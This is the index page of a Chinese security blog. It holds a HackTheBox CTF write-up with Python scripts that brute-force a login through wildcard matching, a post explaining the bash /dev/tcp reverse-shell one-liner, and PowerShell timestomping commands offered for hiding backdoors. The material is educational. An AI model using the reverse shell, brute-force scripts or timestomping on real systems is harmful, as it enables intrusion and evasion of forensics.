<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>忘返</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="我的安全之路">
<meta property="og:type" content="website">
<meta property="og:title" content="忘返">
<meta property="og:url" content="https://7mitu.github.io/index.html">
<meta property="og:site_name" content="忘返">
<meta property="og:description" content="我的安全之路">
<meta property="og:locale">
<meta property="article:author" content="忘返">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="忘返" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">忘返</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">天涯游子，一梦黄粱</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Suche"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://7mitu.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/22/hello-world/" class="article-date">
  <time class="dt-published" datetime="2023-08-22T02:59:24.808Z" itemprop="datePublished">2023-08-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/22/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://7mitu.github.io/2023/08/22/hello-world/" data-id="clllrw167000398y5c45oeyu6" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-HackTheBox_PhoneBook_WriteUP" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/22/HackTheBox_PhoneBook_WriteUP/" class="article-date">
  <time class="dt-published" datetime="2023-08-22T01:15:09.000Z" itemprop="datePublished">2023-08-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/22/HackTheBox_PhoneBook_WriteUP/">HackTheBox PhoneBook WriteUP</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/image-1.png" alt="Who is lucky enough to be included in the phonebook?"></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目给出的网页是这样</p>
<p><img src="/image-2.png" alt="index"></p>
<p>看到HTML中有这样一段代码，还以为这题是个DOM XSS(事实上也确实有XSS)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> queryString = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (queryString) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(queryString);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> message = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;message&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> (message) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;message&quot;</span>).<span class="property">innerHTML</span> = message;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;message&quot;</span>).<span class="property">style</span>.<span class="property">visibility</span> = <span class="string">&quot;visible&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是XSS是需要人触发的，题目中并没有给出任何BOT的信息。</p>
<p>所以最终的解法要落在登录功能上。</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>登录功能可以通过通配符<code>*</code>进入，登录成功之后是一个只有搜索框的页面（这里忘记截图了）。搜索功能可以找到若干账户的信息。</p>
<p><img src="/image-3.png" alt="搜索"></p>
<p>题目的提示是：<code>Who is lucky enough to be included in the phonebook?</code>，所以我们应该想办法获取能登录的账号密码。</p>
<p>登录功能可以识别通配符，所以直接写脚本遍历就好了。</p>
<blockquote>
<p>userbrute.py</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://157.245.43.189:30403/login&quot;</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">126</span>,<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">chr</span>(i)==<span class="string">&#x27;*&#x27;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        uname = value + <span class="built_in">chr</span>(i) + <span class="string">&#x27;*&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: uname, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line">        resp = requests.post(url, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(uname+<span class="string">&#x27;\t&#x27;</span>+<span class="built_in">str</span>(resp.status_code))</span><br><span class="line">        <span class="keyword">if</span>(resp.status_code != <span class="number">302</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span>(resp.headers[<span class="string">&#x27;Location&#x27;</span>] == <span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">            value = value+<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(value)</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>passbrute.py</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://157.245.43.189:30403/login&quot;</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">126</span>,<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">chr</span>(i)==<span class="string">&#x27;*&#x27;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        password = value + <span class="built_in">chr</span>(i) + <span class="string">&#x27;*&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;REESE&quot;</span>, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">        resp = requests.post(url, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment"># print(password+&#x27;\t&#x27;+str(resp.status_code))</span></span><br><span class="line">        <span class="keyword">if</span>(resp.status_code != <span class="number">302</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span>(resp.headers[<span class="string">&#x27;Location&#x27;</span>] == <span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">            value = value+<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(value)</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>取得flag：</p>
<p><img src="/image-4.png" alt="flag"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><del>真正的解题思路是看了别人的writeup才明白的，通配符这是真没想到……</del></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://7mitu.github.io/2023/08/22/HackTheBox_PhoneBook_WriteUP/" data-id="clllrw16b000698y5f3iuf2uf" data-title="HackTheBox PhoneBook WriteUP" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-关于Linux下反弹Shell命令的解释" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/" class="article-date">
  <time class="dt-published" datetime="2021-04-28T08:07:58.000Z" itemprop="datePublished">2021-04-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/">关于Linux下反弹Shell命令的解释</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Linux下反弹shell最常用的一句命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.1.1/1337 &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<p>对这条命令的理解，以我个人经历而言，大概分为几个阶段</p>
<ol>
<li>知道怎么用，但是记不住，用的时候就百度；</li>
<li>大概背过了，也能理解命令某些部分的含义，但仍然不清不楚；</li>
<li>完全理解了命令的每一部分的含义，可以脱离死记硬背，并写出不同形式的命令；</li>
</ol>
<p>说来惭愧，入行多年了，今天才完成第三步，这里仅作一次记录。<br>详细原理三言两语较难说清，这里简单提炼一下主要知识点。</p>
<hr>
<p>前置理论：</p>
<ol>
<li><strong>Linux下的一切都是文件</strong>；</li>
<li>Linux中的文件描述符：</li>
</ol>
<ul>
<li>标准输入 - 0 （默认设备键盘）</li>
<li>标准输出 - 1 （默认设备显示器）</li>
<li>错误输出 - 2 （默认设备显示器）</li>
</ul>
<ol start="3">
<li>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令。</li>
</ol>
<hr>
<p>那么，下面简单拆解一下反弹shell的命令<br><code>bash -c</code>：不解释了；<br><code>bash -i</code>：表示启动一个交互式的Shell；<br><code>&amp;&gt;</code>：表示将所有输出重定向；<br><code>/dev/tcp/ip/port</code>：表示目标的地址*(Linux下一切皆是文件)*；<br><code>&lt;&amp;1</code>：表示将标准输入重定向至标准输出的目标；</p>
<p>简而言之，<code>&amp;&gt;</code>实现了命令输入在攻击端完成，<code>&lt;&amp;1</code>实现了命令结果输出在攻击端。</p>
<hr>
<p>参考资料：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://item.jd.com/12443890.html">《鸟哥的Linux私房菜》</a></li>
<li><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linux反弹shell（一）文件描述符与重定向</a></li>
<li><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux 反弹shell（二）反弹shell的本质</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://7mitu.github.io/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/" data-id="clllrw16d000a98y58hysh9sw" data-title="关于Linux下反弹Shell命令的解释" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-批量修改文件-文件夹时间属性" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/" class="article-date">
  <time class="dt-published" datetime="2021-04-09T07:35:22.000Z" itemprop="datePublished">2021-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/">利用Powershell修改文件/文件夹时间属性</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul>
<li>后门隐藏</li>
<li>蜜罐搭建</li>
<li>钓鱼&#x2F;水坑攻击</li>
</ul>
<h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><h3 id="单文件时间属性修改"><a href="#单文件时间属性修改" class="headerlink" title="单文件时间属性修改"></a>单文件时间属性修改</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#最后访问时间</span></span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="string">&quot;C:/path/to/yourfile&quot;</span>).LastAccessTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line"><span class="comment">#最后保存时间</span></span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="string">&quot;C:/path/to/yourfile&quot;</span>).LastWriteTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line"><span class="comment">#文件创建时间</span></span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="string">&quot;C:/path/to/yourfile&quot;</span>).CreationTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="多文件时间属性批量修改"><a href="#多文件时间属性批量修改" class="headerlink" title="多文件时间属性批量修改"></a>多文件时间属性批量修改</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#当前目录所有文件及文件夹时间属性修改</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$n</span> <span class="keyword">in</span> <span class="variable">$</span>(<span class="built_in">Get-ChildItem</span>).Name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).LastAccessTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).LastWriteTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).CreationTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#仅修改当前目录文件的时间属性（不包含文件夹）</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$n</span> <span class="keyword">in</span> <span class="variable">$</span>(<span class="built_in">Get-ChildItem</span> <span class="operator">-File</span>).Name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).LastAccessTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).LastWriteTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).CreationTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#仅修改当前目录文件夹的时间属性（不包含文件）</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$n</span> <span class="keyword">in</span> <span class="variable">$</span>(<span class="built_in">Get-ChildItem</span> <span class="literal">-Directory</span>).Name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).LastAccessTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).LastWriteTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).CreationTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改当前目录下所有文件及文件夹的时间属性（包括子文件夹）</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$n</span> <span class="keyword">in</span> <span class="variable">$</span>(<span class="built_in">Get-ChildItem</span> <span class="literal">-Recurse</span>).FullName)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).LastAccessTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).LastWriteTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).CreationTime=<span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;1999/1/1 12:12:12&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#将当前目录下所有文件及文件夹时间属性设置为随机时间</span></span><br><span class="line"><span class="comment">#示例时间随机范围为2019/1/2至操作系统当前时间</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$n</span> <span class="keyword">in</span> <span class="variable">$</span>(<span class="built_in">Get-ChildItem</span> <span class="literal">-Recurse</span>).FullName)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).LastAccessTime=<span class="variable">$</span>(<span class="built_in">Get-Random</span> <span class="literal">-Minimum</span> <span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;2019/1/2&quot;</span>).Ticks <span class="literal">-Maximum</span> <span class="variable">$</span>(<span class="built_in">Get-Date</span>).Ticks |<span class="built_in">Get-Date</span>)</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).LastWriteTime=<span class="variable">$</span>(<span class="built_in">Get-Random</span> <span class="literal">-Minimum</span> <span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;2019/1/2&quot;</span>).Ticks <span class="literal">-Maximum</span> <span class="variable">$</span>(<span class="built_in">Get-Date</span>).Ticks |<span class="built_in">Get-Date</span>)</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$n</span>).CreationTime=<span class="variable">$</span>(<span class="built_in">Get-Random</span> <span class="literal">-Minimum</span> <span class="variable">$</span>(<span class="built_in">Get-Date</span> <span class="string">&quot;2019/1/2&quot;</span>).Ticks <span class="literal">-Maximum</span> <span class="variable">$</span>(<span class="built_in">Get-Date</span>).Ticks |<span class="built_in">Get-Date</span>)</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://7mitu.github.io/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/" data-id="clllrw16i000s98y528xs60oy" data-title="利用Powershell修改文件/文件夹时间属性" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CheckList/" rel="tag">CheckList</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%AC%BA%E9%AA%97/" rel="tag">欺骗</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-一个Get-Title引出的坑" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/" class="article-date">
  <time class="dt-published" datetime="2021-01-26T08:31:49.000Z" itemprop="datePublished">2021-01-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/">一个Get-Title的自我修养</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近要整理大量的网页资料，刚好完善一下以前写的get-title脚本。<br>目标：获取所有URL对应网页的Title，并以友好的格式输出至文件。<br>此脚本原来是渗透的时候搞网段用的，把扫出来的Web的title列举出来，从而对自己的目标有个大致的概念。但是早先的版本只能说是可以将就着用，往往输出的格式乱七八糟，刚好借着这次机会重写一下。也顺便将其从python2过渡到python3。</p>
